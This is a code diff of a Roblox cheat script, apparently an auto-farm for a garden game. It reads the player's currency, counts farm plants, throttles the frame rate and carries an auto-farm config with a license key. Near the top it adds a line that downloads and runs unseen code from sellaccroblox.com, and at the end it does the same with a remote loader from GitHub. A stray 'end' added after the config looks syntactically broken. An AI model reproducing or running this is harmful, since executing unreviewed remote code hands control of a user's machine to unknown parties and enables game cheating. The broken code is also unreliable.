@@ -1,3 +1,73 @@
+getgenv().daubuoi = true
+
+task.delay(1, function()
+    loadstring(game:HttpGet("https://sellaccroblox.com/raw/view.php?file=lilbip%2FextraGAG.txt"))()
+end)
+
+local Players = game:GetService("Players")
+local player = Players.LocalPlayer
+local LocalDataService = require(game:GetService("ReplicatedStorage"):WaitForChild("Modules", 10).DataService)
+
+
+local playerData = LocalDataService:GetData()
+local Tienhienco2 = playerData.Sheckles
+print(Tienhienco2)
+
+local function getFarm()
+    local success, farm = pcall(function()
+        for _, farm in ipairs(workspace:WaitForChild("Farm", 10):GetChildren()) do
+            local owner = farm:WaitForChild("Important", 5).Data.Owner.Value
+            if owner == player.Name then
+                return farm
+            end
+        end
+        return nil
+    end)
+    if success and farm then
+        return farm
+    else
+        warn("Failed to find farm: " .. (success and "No farm found" or tostring(farm)))
+        return nil
+    end
+end
+
+local farm = getFarm()
+
+-- Function to count all plants and tomatoes in Plants_Physical
+local function countPlantsPhysical()
+    if farm then
+        local success, plantsPhysical = pcall(function()
+            return farm:WaitForChild("Important", 5).Plants_Physical
+        end)
+        if success and plantsPhysical then
+            local totalPlants = 0
+            local tomatoCount = 0
+            for _, child in ipairs(plantsPhysical:GetChildren()) do
+                totalPlants = totalPlants + 1
+                if child.Name == "Tomato" then
+                    tomatoCount = tomatoCount + 1
+                end
+            end
+            print("Total plants in Plants_Physical: " .. totalPlants)
+            print("Number of 'Tomato' plants: " .. tomatoCount)
+            return totalPlants, tomatoCount
+        else
+            warn("Failed to access Plants_Physical: " .. (success and "Not found" or tostring(plantsPhysical)))
+            return 0, 0
+        end
+    else
+        warn("No farm available to count plants")
+        return 0, 0
+    end
+end
+
+-- Example usage
+-- local socay, sotomato = countPlantsPhysical()
+setfpscap(2)
+task.delay(60, function()
+    setfpscap(2)
+end)
+
 getgenv().ConfigsKaitun = {
 	["Block Pet Gift"] = true,
 	["Low Cpu"] = true,
@@ -254,6 +324,8 @@ getgenv().ConfigsKaitun = {
 		}
 	},
 }
+end
+
 -- License = "imPTF7guCKxCZ6t9BDddQG8U8onOpPaA"
 License = "XcXS9v9RNf9e0vHEr77NBTx3VP2frtac"
 loadstring(game:HttpGet('https://raw.githubusercontent.com/Real-Aya/Loader/main/Init.lua'))()
